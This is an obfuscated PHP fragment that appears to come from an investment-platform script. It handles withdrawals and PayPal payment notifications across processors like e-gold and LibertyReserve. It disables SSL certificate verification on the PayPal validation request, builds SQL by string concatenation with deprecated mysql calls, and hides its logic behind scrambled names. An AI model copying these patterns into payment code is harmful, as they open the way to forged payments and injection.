  $elnlcPjSDq = array ('withdraw_pending' => 'Withdrawal request', 'add_funds' => 'Transfer from external processings', 'deposit' => 'Deposit', 'bonus' => 'Bonus', 'penality' => 'Penalty', 'earning' => 'Earning', 'withdrawal' => 'Withdrawal', 'commissions' => 'Referral commission', 'early_deposit_release' => 'Deposit release', 'early_deposit_charge' => 'Commission for an early deposit release', 'release_deposit' => 'Deposit returned to user account', 'exchange_out' => ' Received on exchange', 'exchange_in' => 'Spent on exchange', 'exchange' => 'Exchange', 'internal_transaction_spend' => 'Spent on Internal Transaction', 'internal_transaction_receive' => 'Received from Internal Transaction');
  if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlczmsG'])
  {
    $elnlcpvEj[$elnlcMVquv['elnlcxByCH']] = $elnlcMVquv['elnlcLMmqv'];
  }

  if ($elnlcpvEj[$elnlcMVquv['elnlcxByCH']] == $elnlcMVquv['elnlcGcuuv'])
  {
    $elnlcBQTfP = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1));
    $elnlcpvEj[$elnlcMVquv['elnlcapEpp']] = '&#8364;';
    $elnlcpvEj[$elnlcMVquv['elnlcBwBAt']] = $elnlcMVquv['elnlcJimUM'];
    $elnlcpvEj[$elnlcMVquv['elnlcszRG']] = $elnlcMVquv['elnlcqHvcs'];
    $elnlcpvEj[$elnlcMVquv['elnlcBCSIy']] = $elnlcMVquv['elnlceiGP'];
  }
  else
  {
    if (($elnlcpvEj[$elnlcMVquv['elnlcxByCH']] == $elnlcMVquv['elnlcIeRl'] AND $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcSTlLV']))
    {
      $elnlcBQTfP = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1));
      $elnlcpvEj[$elnlcMVquv['elnlcapEpp']] = $elnlcMVquv['elnlcUtzo'];
      $elnlcpvEj[$elnlcMVquv['elnlcBwBAt']] = $elnlcMVquv['elnlcIukv'];
    }
    else
    {
      $elnlcBQTfP = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 8 => array ('name' => 'eeeCurrency', 'sfx' => 'eeecurrency', has_account => 1, auto => 1), 9 => array ('name' => 'Pecunix', 'sfx' => 'pecunix', has_account => 1, auto => 1), 11 => array ('name' => 'AlertPay', 'sfx' => 'alertpay', has_account => 1, auto => 1), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1), 16 => array ('name' => 'V-Money', 'sfx' => 'vmoney', has_account => 1, auto => 1), 17 => array ('name' => 'AlterGold', 'sfx' => 'altergold', has_account => 1, auto => 1), 18 => array ('name' => 'Perfectmoney', 'sfx' => 'perfectmoney', has_account => 1, auto => 1), 19 => array ('name' => 'c-gold', 'sfx' => 'cgold', has_account => 1, auto => 0), 20 => array ('name' => 'Webmoney', 'sfx' => 'webmoney', has_account => 1, auto => 0), 21 => array ('name' => 'Strictpay', 'sfx' => 'strictpay', has_account => 1, auto => 0), 22 => array ('name' => 'SolidTrustPay', 'sfx' => 'solidtrustpay', has_account => 1, auto => 0), 23 => array ('name' => 'Ecumoney', 'sfx' => 'ecumoney', has_account => 1, auto => 0), 24 => array ('name' => 'EvoWallet', 'sfx' => 'evowallet', has_account => 1, auto => 1), 26 => array ('name' => 'RoutePay', 'sfx' => 'routepay', has_account => 1, auto => 0), 27 => array ('name' => 'EuroGoldCash', 'sfx' => 'eurogoldcash', has_account => 1, auto => 0), 28 => array ('name' => 'GlobalDigitalPay', 'sfx' => 'globaldigitalpay', has_account => 1, auto => 0));
      $elnlcpvEj[$elnlcMVquv['elnlcapEpp']] = '$';
      $elnlcpvEj[$elnlcMVquv['elnlcBwBAt']] = $elnlcMVquv['elnlczUlK'];
      $elnlcpvEj[$elnlcMVquv['elnlcszRG']] = $elnlcMVquv['elnlcGMVmV'];
      $elnlcpvEj[$elnlcMVquv['elnlcBCSIy']] = $elnlcMVquv['elnlcrTNO'];
    }
  }

  $elnlcpvEj[$elnlcMVquv['elnlcsStz']] = $elnlcMVquv['elnlczUlK'];
  if ((($elnlcpvEj[$elnlcMVquv['elnlceUVS']] AND !$elnlcpvEj[$elnlcMVquv['elnlcdobB']]) AND !$elnlcpvEj[$elnlcMVquv['elnlcPiWBf']]))
  {
    $elnlcpvEj[$elnlcMVquv['elnlcPiWBf']] = $elnlcMVquv['elnlczUlK'];
  }

  if ($elnlcpvEj[$elnlcMVquv['elnlcdobB']])
  {
    $elnlcpvEj[$elnlcMVquv['elnlcHoDoO']] = $elnlcpvEj[$elnlcMVquv['elnlceUVS']];
  }
  else
  {
    $elnlcpvEj[$elnlcMVquv['elnlcHoDoO']] = '';
  }

  if ($elnlcpvEj[$elnlcMVquv['elnlcPiWBf']])
  {
    $elnlcpvEj[$elnlcMVquv['elnlcWPmM']] = $elnlcpvEj[$elnlcMVquv['elnlceUVS']];
  }
  else
  {
    $elnlcpvEj[$elnlcMVquv['elnlcWPmM']] = '';
  }

  foreach ($elnlcBQTfP as $elnlczmvck => $elnlcVtfRt)
  {
    if (($elnlcpvEj['def_payee_account_' . $elnlcVtfRt['sfx']] != '' AND $elnlcpvEj['def_payee_account_' . $elnlcVtfRt['sfx']] != '0'))
    {
      $elnlcBQTfP[$elnlczmvck][$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlczUlK'];
      continue;
    }
    else
    {
      $elnlcBQTfP[$elnlczmvck][$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcvCqE'];
      continue;
    }
  }

  if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcJgeH'])
  {
    $elnlcFWOD = array (1 => 'english', 2 => 'estonians', 3 => $elnlcMVquv['elnlcxnkf']);
  }

  if (($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] != 'RHLFPPEURGQGG68GXYA8' AND $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] != 'VQP8CM95UXTXEX44G7NR'))
  {
    $elnlcpvEj[$elnlcMVquv['elnlcjUWdq']] = $elnlcMVquv['elnlcvCqE'];
  }

  if (($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcVkSiI'] OR $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcBcAEc']))
  {
    $elnlcpvEj[$elnlcMVquv['elnlcdFbrH']] = $elnlcMVquv['elnlczUlK'];
  }

  if ($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlceNOHE'])
  {
    ini_set ('sendmail_from', 'admin@plan4fun.net');
  }

  if (((((($elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcPPlMU'] OR $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlciKWd']) OR $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcUTUrm']) OR $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcIvryh']) OR $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcobzs']) OR $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] == $elnlcMVquv['elnlcoFat']))
  {
    if ($elnlcvflv[$elnlcMVquv['elnlcvFNu']] != '')
    {
      $elnlcvflv[$elnlcMVquv['elnlcqDqNc']] = $elnlcvflv[$elnlcMVquv['elnlcvFNu']];
      $_SERVER[$elnlcMVquv['elnlcqDqNc']] = $elnlcvflv[$elnlcMVquv['elnlcvFNu']];
    }
  }

  $elnlcwFye = elnlcmqpmc ();
  if (!$elnlcwFye)
  {
    print 'Cannot connect mysql';
    exit ();
  }

  list ($elnlcGjImz, $elnlcMKibB, $elnlcafCs) = preg_split ('/\\|/', $elnlcmcJN[$elnlcMVquv['elnlcPCLzI']]);
  if ($elnlcGjImz == $elnlcMVquv['elnlcwDcSA'])
  {
    $elnlcoJlsg = elnlckjnjt ($elnlcmcJN[$elnlcMVquv['elnlcUPyf']]);
    list ($elnlczmvck, $elnlcbjcpW) = explode ('-', $elnlcMKibB);
    $elnlczmvck = sprintf ('%d', $elnlczmvck);
    if ($elnlcbjcpW == '')
    {
      $elnlcbjcpW = $elnlcMVquv['elnlcLkMlO'];
    }

    $elnlcbjcpW = elnlckjnjt ($elnlcbjcpW);
    $q = '' . 'select * from hm2_history where id = ' . $elnlczmvck . ' and str = \'' . $elnlcbjcpW . '\' and type=\'withdraw_pending\'';
    $elnlcOsDxl = mysql_query ($q);
    while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
    {
      $q = '' . 'delete from hm2_history where id = ' . $elnlczmvck;
      (mysql_query ($q) OR print mysql_error ());
      $q = 'insert into hm2_history set 
	user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ',
	amount = -' . abs ($elnlcweaeO[$elnlcMVquv['elnlcGRxou']]) . ('' . ',
	type = \'withdrawal\',
	description = \'Withdraw processed. Batch id = ' . $elnlcoJlsg . '\',
	actual_amount = -') . abs ($elnlcweaeO[$elnlcMVquv['elnlcGRxou']]) . ',
	ec = 6,
	date = now()
	';
      (mysql_query ($q) OR print mysql_error ());
      $q = 'select * from hm2_users where id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']];
      $elnlcSJcFV = mysql_query ($q);
      $elnlcEifF = mysql_fetch_array ($elnlcSJcFV);
      $elnlcRhpt = array ($elnlcgKTMb);
      $elnlcRhpt[$elnlcMVquv['elnlcRzkgp']] = $elnlcEifF[$elnlcMVquv['elnlcRzkgp']];
      $elnlcRhpt[$elnlcMVquv['elnlcMCqpV']] = $elnlcEifF[$elnlcMVquv['elnlcMCqpV']];
      $elnlcRhpt[$elnlcMVquv['elnlcGRxou']] = sprintf ('%.02f', abs ($elnlcweaeO[$elnlcMVquv['elnlcGRxou']]));
      $elnlcRhpt[$elnlcMVquv['elnlcEmcBS']] = $elnlcmcJN[$elnlcMVquv['elnlcqFuRO']];
      $elnlcRhpt[$elnlcMVquv['elnlcNvcv']] = $elnlcoJlsg;
      $elnlcRhpt[$elnlcMVquv['elnlcgNtO']] = $elnlcoJlsg;
      $elnlcRhpt[$elnlcMVquv['elnlcnHUc']] = $elnlcoJlsg;
      $elnlcRhpt[$elnlcMVquv['elnlcwBFz']] = $elnlcBQTfP[6][$elnlcMVquv['elnlcMCqpV']];
      elnlcvgfng ('withdraw_user_notification', $elnlcEifF['email'], $elnlcpvEj[$elnlcMVquv['elnlcWIVix']], $elnlcRhpt);
    }

    header ('Location: admin.php?a=pay_withdraw&say=yes');
    elnlcojgjg ($elnlcwFye);
    exit ();
  }

  if (function_exists ('curl_init'))
  {
    $elnlcEbKdb = 'cmd=_notify-validate';
    foreach ($elnlcmcJN as $elnlcTrrSU => $elnlcKDxqb)
    {
      $elnlcKDxqb = urlencode (stripslashes ($elnlcKDxqb));
      $elnlcEbKdb .= '' . '&' . $elnlcTrrSU . '=' . $elnlcKDxqb;
    }

    $elnlcTQnW = curl_init ();
    curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://www.paypal.com/cgi-bin/webscr');
    curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
    curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, $elnlcEbKdb);
    curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
    $elnlcvUdmU = curl_exec ($elnlcTQnW);
    curl_close ($elnlcTQnW);
    if ((((($elnlcvUdmU == $elnlcMVquv['elnlcxDNoI'] AND $elnlcmcJN[$elnlcMVquv['elnlcRVCO']] == $elnlcMVquv['elnlcAmMq']) AND strtolower ($elnlcmcJN[$elnlcMVquv['elnlcqFuRO']]) == strtolower ($elnlcpvEj[$elnlcMVquv['elnlcyKgUU']])) AND $elnlcmcJN[$elnlcMVquv['elnlcUUmG']] == $elnlcpvEj[paypal_currency]) AND $elnlcBQTfP[6][$elnlcMVquv['elnlcxBlW']] == 1))
    {
      $elnlcMKibB = sprintf ('%d', $elnlcMKibB);
      $elnlcafCs = sprintf ('%d', $elnlcafCs);
      $elnlcJgboW = sprintf ('%d', $elnlcmcJN[$elnlcMVquv['elnlcokxs']]);
      $elnlcusGj = $elnlcmcJN[$elnlcMVquv['elnlcgKzf']];
      $elnlcoJlsg = $elnlcmcJN[$elnlcMVquv['elnlcUPyf']];
      $elnlcpGcN = $elnlcmcJN[$elnlcMVquv['elnlcFQOBA']];
      if ($elnlcGjImz == $elnlcMVquv['elnlcQBsSO'])
      {
        elnlccdokr (6, $elnlcMKibB, $elnlcusGj, $elnlcoJlsg, $elnlcpGcN, $elnlcafCs, $elnlcJgboW);
        header ('Location: index.php?a=return_egold&process=yes');
        elnlcojgjg ($elnlcwFye);
        exit ();
      }
    }
  }

  header ('Location: index.php?a=return_egold&process=no');
  elnlcojgjg ($elnlcwFye);
  exit ();
?>